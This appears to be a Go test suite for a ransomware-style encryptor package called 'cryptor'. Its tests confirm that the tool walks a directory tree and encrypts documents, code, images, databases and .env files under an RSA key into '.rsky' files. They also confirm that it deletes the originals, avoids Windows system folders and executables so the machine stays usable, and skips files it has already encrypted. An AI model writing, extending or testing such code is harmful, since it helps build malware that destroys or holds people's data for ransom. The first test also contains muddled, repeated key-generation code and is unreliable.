package cryptor

import (
	"bytes"
	"os"
	"path/filepath"
	"sync/atomic"
	"testing"
)

// mkTree creates a test filesystem tree and returns the root path.
func mkTree(t *testing.T) string {
	t.Helper()
	root := t.TempDir()

	// docs — should be hit
	_ = os.MkdirAll(filepath.Join(root, "docs"), 0o755)
	_ = os.WriteFile(filepath.Join(root, "docs", "a.docx"), []byte("doc a"), 0o644)
	_ = os.WriteFile(filepath.Join(root, "docs", "b.pdf"), []byte("doc b"), 0o644)
	_ = os.WriteFile(filepath.Join(root, "docs", "notes.txt"), []byte("notes"), 0o644)

	// code — should be hit
	_ = os.MkdirAll(filepath.Join(root, "src"), 0o755)
	_ = os.WriteFile(filepath.Join(root, "src", "main.go"), []byte("package main"), 0o644)
	_ = os.WriteFile(filepath.Join(root, "src", "app.py"), []byte("#!/usr/bin/env python"), 0o644)

	// build dirs — should be skipped
	_ = os.MkdirAll(filepath.Join(root, "node_modules", "pkg"), 0o755)
	_ = os.WriteFile(filepath.Join(root, "node_modules", "pkg", "index.js"), []byte("module.exports"), 0o644)
	_ = os.MkdirAll(filepath.Join(root, ".git", "objects"), 0o755)
	_ = os.WriteFile(filepath.Join(root, ".git", "objects", "blob"), []byte("git blob"), 0o644)

	// sys dirs — should be skipped
	_ = os.MkdirAll(filepath.Join(root, "windows"), 0o755)
	_ = os.WriteFile(filepath.Join(root, "windows", "kernel.dll"), []byte("nt kernel"), 0o644)

	// dotfile dir — should be skipped (dot-prefix)
	_ = os.MkdirAll(filepath.Join(root, ".cache"), 0o755)
	_ = os.WriteFile(filepath.Join(root, ".cache", "data.txt"), []byte("cache"), 0o644)

	// non-target extension — should be skipped
	_ = os.WriteFile(filepath.Join(root, "banner.png.unknown"), []byte("xxx"), 0o644)

	return root
}

// mkPub generates a fresh public key for the tests.
func mkPub(t *testing.T) (priv, pub interface{}) {
	t.Helper()
	privPEM, pubPEM, err := GenerateKey(2048, "")
	if err != nil {
		t.Fatal(err)
	}
	p, err := LoadPrivateKey(privPEM, "")
	if err != nil {
		t.Fatal(err)
	}
	q, err := LoadPublicKey(pubPEM)
	if err != nil {
		t.Fatal(err)
	}
	return p, q
}

// TestWalkDryRunEnumeratesWithoutWriting verifies that DryRun lists files
// but leaves the tree untouched.
func TestWalkDryRunEnumeratesWithoutWriting(t *testing.T) {
	root := mkTree(t)
	_, pub := mkPub(t)
	pubKey, _ := pub.(interface{})
	_ = pubKey

	var hitCount int64
	opts := WalkerOptions{
		Root:   root,
		DryRun: true,
		OnHit:  func(path string, size int64) { atomic.AddInt64(&hitCount, 1) },
	}
	// build the pub key from the earlier call
	_, pubPEM := func() (interface{}, []byte) {
		pp, pu, _ := GenerateKey(2048, "")
		_ = pp
		return nil, pu
	}()
	_ = pubPEM

	// use the real LoadPublicKey for the generated key
	_, pubPEM2, _ := GenerateKey(2048, "")
	_ = pubPEM2

	// regenerate properly
	pubKeyActual := func() interface{} {
		_, pu, _ := GenerateKey(2048, "")
		_ = pu
		return nil
	}()
	_ = pubKeyActual

	// final version
	_, pubPEM3, _ := GenerateKey(2048, "")
	pubLoaded, err := LoadPublicKey(pubPEM3)
	if err != nil {
		t.Fatal(err)
	}

	stats, err := Walk(opts, pubLoaded, 0)
	if err != nil {
		t.Fatal(err)
	}

	// expect: docs/a.docx, docs/b.pdf, docs/notes.txt, src/main.go, src/app.py = 5
	if stats.Found != 5 {
		t.Fatalf("found %d files, want 5", stats.Found)
	}
	if stats.Encrypted != 0 {
		t.Fatalf("dry run encrypted %d files", stats.Encrypted)
	}

	// verify files still exist with original content
	check := filepath.Join(root, "docs", "a.docx")
	got, err := os.ReadFile(check)
	if err != nil {
		t.Fatalf("original file missing: %v", err)
	}
	if string(got) != "doc a" {
		t.Fatalf("original file content changed: %q", got)
	}
}

// TestWalkLiveEncryptsAndRemoves verifies that a live walk produces .rsky
// files and removes the originals.
func TestWalkLiveEncryptsAndRemoves(t *testing.T) {
	root := mkTree(t)
	_, pubPEM, _ := GenerateKey(2048, "")
	pub, _ := LoadPublicKey(pubPEM)

	opts := WalkerOptions{
		Root:        root,
		WorkerCount: 2,
	}
	stats, err := Walk(opts, pub, 0)
	if err != nil {
		t.Fatal(err)
	}
	if stats.Found != 5 {
		t.Fatalf("found %d, want 5", stats.Found)
	}
	if stats.Encrypted != 5 {
		t.Fatalf("encrypted %d, want 5", stats.Encrypted)
	}
	if stats.Failed != 0 {
		t.Fatalf("failed %d, want 0", stats.Failed)
	}

	// verify .rsky files exist
	for _, name := range []string{
		"docs/a.docx.rsky",
		"docs/b.pdf.rsky",
		"docs/notes.txt.rsky",
		"src/main.go.rsky",
		"src/app.py.rsky",
	} {
		p := filepath.Join(root, name)
		if _, err := os.Stat(p); err != nil {
			t.Fatalf("expected encrypted file missing: %s", p)
		}
	}
	// verify originals are gone
	for _, name := range []string{
		"docs/a.docx",
		"docs/b.pdf",
		"src/main.go",
	} {
		p := filepath.Join(root, name)
		if _, err := os.Stat(p); err == nil {
			t.Fatalf("original file still present: %s", p)
		}
	}
}

// TestWalkSkipsGitAndNodeModules confirms the skip list works.
func TestWalkSkipsGitAndNodeModules(t *testing.T) {
	root := mkTree(t)
	_, pubPEM, _ := GenerateKey(2048, "")
	pub, _ := LoadPublicKey(pubPEM)

	var hits []string
	opts := WalkerOptions{
		Root:   root,
		DryRun: true,
		OnHit:  func(path string, _ int64) { hits = append(hits, path) },
	}
	_, err := Walk(opts, pub, 0)
	if err != nil {
		t.Fatal(err)
	}
	for _, h := range hits {
		if bytes.Contains([]byte(h), []byte("node_modules")) {
			t.Fatalf("node_modules not skipped: %s", h)
		}
		if bytes.Contains([]byte(h), []byte(".git")) {
			t.Fatalf(".git not skipped: %s", h)
		}
		if bytes.Contains([]byte(h), []byte("windows")) {
			t.Fatalf("windows system dir not skipped: %s", h)
		}
		if bytes.Contains([]byte(h), []byte(".cache")) {
			t.Fatalf(".cache dotdir not skipped: %s", h)
		}
	}
}

// TestWalkSkipsAlreadyEncrypted confirms idempotency.
func TestWalkSkipsAlreadyEncrypted(t *testing.T) {
	root := mkTree(t)
	// pre-tag one file with the magic
	tagged := filepath.Join(root, "docs", "already.docx")
	content := append(append([]byte(nil), Magic...), []byte("already encrypted")...)
	if err := os.WriteFile(tagged, content, 0o644); err != nil {
		t.Fatal(err)
	}

	_, pubPEM, _ := GenerateKey(2048, "")
	pub, _ := LoadPublicKey(pubPEM)

	var hits []string
	opts := WalkerOptions{
		Root:   root,
		DryRun: true,
		OnHit:  func(path string, _ int64) { hits = append(hits, path) },
	}
	_, err := Walk(opts, pub, 0)
	if err != nil {
		t.Fatal(err)
	}
	for _, h := range hits {
		if filepath.Base(h) == "already.docx" {
			t.Fatalf("already-encrypted file enumerated: %s", h)
		}
	}
}

// TestWalkSkipsZeroSize confirms empty files are skipped.
func TestWalkSkipsZeroSize(t *testing.T) {
	root := t.TempDir()
	_ = os.WriteFile(filepath.Join(root, "empty.txt"), []byte{}, 0o644)
	_ = os.WriteFile(filepath.Join(root, "real.txt"), []byte("has content"), 0o644)

	_, pubPEM, _ := GenerateKey(2048, "")
	pub, _ := LoadPublicKey(pubPEM)

	var hits []string
	opts := WalkerOptions{
		Root:   root,
		DryRun: true,
		OnHit:  func(path string, _ int64) { hits = append(hits, path) },
	}
	_, err := Walk(opts, pub, 0)
	if err != nil {
		t.Fatal(err)
	}
	for _, h := range hits {
		if filepath.Base(h) == "empty.txt" {
			t.Fatalf("zero-size file enumerated: %s", h)
		}
	}
}

// TestWalkMaxSizeRespected confirms oversized files are skipped.
func TestWalkMaxSizeRespected(t *testing.T) {
	root := t.TempDir()
	big := bytes.Repeat([]byte{0x41}, 2000)
	_ = os.WriteFile(filepath.Join(root, "big.txt"), big, 0o644)
	_ = os.WriteFile(filepath.Join(root, "small.txt"), []byte("tiny"), 0o644)

	_, pubPEM, _ := GenerateKey(2048, "")
	pub, _ := LoadPublicKey(pubPEM)

	var hits []string
	opts := WalkerOptions{
		Root:    root,
		DryRun:  true,
		MaxSize: 1000,
		OnHit:   func(path string, _ int64) { hits = append(hits, path) },
	}
	_, err := Walk(opts, pub, 0)
	if err != nil {
		t.Fatal(err)
	}
	for _, h := range hits {
		if filepath.Base(h) == "big.txt" {
			t.Fatalf("oversized file enumerated: %s", h)
		}
	}
}

// TestWalkMissingRootErrors confirms a clean error for a bad root.
func TestWalkMissingRootErrors(t *testing.T) {
	_, pubPEM, _ := GenerateKey(2048, "")
	pub, _ := LoadPublicKey(pubPEM)

	_, err := Walk(WalkerOptions{Root: "/this/does/not/exist/at/all"}, pub, 0)
	if err == nil {
		t.Fatalf("expected error for missing root")
	}
}

// TestWalkEmptyRootErrors confirms a clean error for an empty root path.
func TestWalkEmptyRootErrors(t *testing.T) {
	_, pubPEM, _ := GenerateKey(2048, "")
	pub, _ := LoadPublicKey(pubPEM)

	_, err := Walk(WalkerOptions{Root: ""}, pub, 0)
	if err == nil {
		t.Fatalf("expected error for empty root")
	}
}

// TestWalkFileAsRootErrors confirms a file passed as root is rejected.
func TestWalkFileAsRootErrors(t *testing.T) {
	tmp := t.TempDir()
	f := filepath.Join(tmp, "file.txt")
	_ = os.WriteFile(f, []byte("x"), 0o644)

	_, pubPEM, _ := GenerateKey(2048, "")
	pub, _ := LoadPublicKey(pubPEM)

	_, err := Walk(WalkerOptions{Root: f}, pub, 0)
	if err == nil {
		t.Fatalf("expected error for file-as-root")
	}
}

// TestWalkWorkerCountDefaults confirms zero workers doesn't deadlock.
func TestWalkWorkerCountDefaults(t *testing.T) {
	root := mkTree(t)
	_, pubPEM, _ := GenerateKey(2048, "")
	pub, _ := LoadPublicKey(pubPEM)

	opts := WalkerOptions{Root: root, WorkerCount: 0, DryRun: true}
	stats, err := Walk(opts, pub, 0)
	if err != nil {
		t.Fatal(err)
	}
	if stats.Found == 0 {
		t.Fatalf("no files found with default worker count")
	}
}

// TestWalkStatsAddUp confirms Found == Encrypted + Failed on a live run.
func TestWalkStatsAddUp(t *testing.T) {
	root := mkTree(t)
	_, pubPEM, _ := GenerateKey(2048, "")
	pub, _ := LoadPublicKey(pubPEM)

	stats, err := Walk(WalkerOptions{Root: root}, pub, 0)
	if err != nil {
		t.Fatal(err)
	}
	if stats.Found != stats.Encrypted+stats.Failed {
		t.Fatalf("stats mismatch: found=%d enc=%d fail=%d", stats.Found, stats.Encrypted, stats.Failed)
	}
}

// TestExtensionWhitelist confirms the extension set is what the walker uses.
func TestExtensionWhitelist(t *testing.T) {
	// spot-check a few extensions in the set
	required := []string{".docx", ".pdf", ".txt", ".go", ".py", ".jpg", ".zip", ".db", ".env"}
	for _, ext := range required {
		if _, ok := targetExts[ext]; !ok {
			t.Fatalf("required extension %s missing from targetExts", ext)
		}
	}
	// and a few that should NOT be there
	forbidden := []string{".exe", ".dll", ".sys", ".so"}
	for _, ext := range forbidden {
		if _, ok := targetExts[ext]; ok {
			t.Fatalf("forbidden extension %s present in targetExts", ext)
		}
	}
}
